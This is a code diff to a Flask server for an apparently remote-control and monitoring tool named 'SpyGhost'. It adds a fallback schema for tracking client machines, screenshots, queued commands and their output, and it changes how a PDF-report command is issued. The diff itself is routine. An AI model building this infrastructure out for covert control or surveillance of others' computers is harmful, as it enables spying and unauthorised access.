@@ -828,8 +828,74 @@ def reset_database():
         
         # Initialiser la nouvelle base de données
         conn = sqlite3.connect(temp_db)
-        with app.open_resource('schema.sql', mode='r') as f:
-            conn.cursor().executescript(f.read())
+        
+        # Essayer d'abord app.open_resource, puis chercher le fichier dans le répertoire de l'exécutable
+        schema_content = None
+        try:
+            with app.open_resource('schema.sql', mode='r') as f:
+                schema_content = f.read()
+        except Exception as e:
+            app.logger.warning(f"Impossible d'ouvrir schema.sql via app.open_resource: {e}")
+            # Fallback: chercher schema.sql dans le répertoire de l'exécutable
+            if getattr(sys, 'frozen', False):
+                # Dans un exécutable PyInstaller
+                schema_path = os.path.join(os.path.dirname(sys.executable), 'schema.sql')
+            else:
+                # Dans un script Python normal
+                schema_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'schema.sql')
+            
+            try:
+                with open(schema_path, 'r', encoding='utf-8') as f:
+                    schema_content = f.read()
+                app.logger.info(f"Schema lu depuis: {schema_path}")
+            except Exception as fallback_error:
+                app.logger.error(f"Impossible de lire schema.sql depuis {schema_path}: {fallback_error}")
+                # Dernier recours: créer le schéma manuellement
+                schema_content = """
+-- Schéma de la base de données pour l'application SpyGhost
+
+-- Table des clients
+DROP TABLE IF EXISTS clients;
+CREATE TABLE clients (
+    id INTEGER PRIMARY KEY AUTOINCREMENT,
+    name TEXT NOT NULL,
+    os_type TEXT NOT NULL,
+    last_checkin INTEGER,
+    is_connected BOOLEAN DEFAULT 0,
+    last_screenshot_path TEXT,
+    command_to_execute TEXT,
+    command_output TEXT,
+    add_api_key TEXT,
+    resources TEXT,
+    pdf_report_path TEXT,
+    activity_logs TEXT,
+    
+    -- Paramètres des fonctionnalités
+    settings_virustotal_enabled INTEGER DEFAULT 0,
+    settings_activity_logs_enabled INTEGER DEFAULT 0,
+    settings_file_detection_enabled INTEGER DEFAULT 0,
+    settings_system_resources_enabled INTEGER DEFAULT 0
+);
+
+-- Table de l'historique des commandes
+DROP TABLE IF EXISTS command_history;
+CREATE TABLE command_history (
+    id INTEGER PRIMARY KEY AUTOINCREMENT,
+    client_id INTEGER NOT NULL,
+    command TEXT NOT NULL,
+    command_id TEXT,
+    button_type TEXT DEFAULT 'Manual',
+    status TEXT DEFAULT 'pending',
+    stdout TEXT,
+    stderr TEXT,
+    timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
+    FOREIGN KEY (client_id) REFERENCES clients (id)
+);
+"""
+                app.logger.info("Utilisation du schéma intégré par défaut")
+        
+        if schema_content:
+            conn.cursor().executescript(schema_content)
         
         # Créer un client par défaut pour les paramètres globaux
         conn.execute('''
@@ -873,8 +939,8 @@ def reset_database():
 @auth_required
 def execute_pdf_command(client_id):
     """Exécute la commande pour générer un rapport PDF sur le client et le télécharger."""
-    # Utiliser une commande simple pour exécuter directement pdf_data.py
-    command = "python pdf_data.py"
+    # Utiliser une commande appropriée pour les exécutables
+    command = "GENERATE_PDF_REPORT"  # Commande spéciale que le client peut comprendre
     command_id = f"pdf_report_{int(time.time())}"
     
     # Logguer l'action pour débogage
